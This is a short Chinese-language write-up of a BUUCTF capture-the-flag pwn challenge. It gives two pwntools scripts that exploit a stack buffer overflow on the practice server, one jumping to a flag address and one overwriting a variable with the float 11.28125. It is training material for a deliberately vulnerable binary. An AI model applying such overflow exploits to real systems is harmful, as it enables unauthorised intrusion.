1

解法：

法一：

payload

from pwn import *

连接远程服务器

io = remote(“node5.buuoj.cn”, 25302)

构造Payload（x个a + 64位返回地址）

payload = b”a”*56 + p64(0x4006BE)

发送Payload

io.send(payload)

进入交互模式，可手动输入指令

io.interactive()

直接在IDA找到flag的地址，覆盖完直接过去啊哈哈，特别方便

法二：
因为跳转到system的条件是if（v2 == 11.28125），所以把“v2的值覆盖成11.28125”

payload

from pwn import *
import struct

连接目标服务（本地调试用process，远程用remote）

【# io = process(‘./你的程序文件名’) （# 本地调试时用这行）】
io = remote(“node5.buuoj.cn”, 25302) 【# 远程连接】

步骤1：构造payload

padding = b’A’ * 44 # 填充v1的44字节 #ida直接写了
v2_value = struct.pack(‘<f’, 11.28125) # 11.28125的小端序float值 【#是 Python 中把浮点数转换成对应二进制内存字节的核心操作】

payload = padding + v2_value

步骤2：发送payload（核心缺失步骤）

io.sendline(payload) # 用sendline发送，模拟回车输入
io.interactive() # 交互模式接收flag
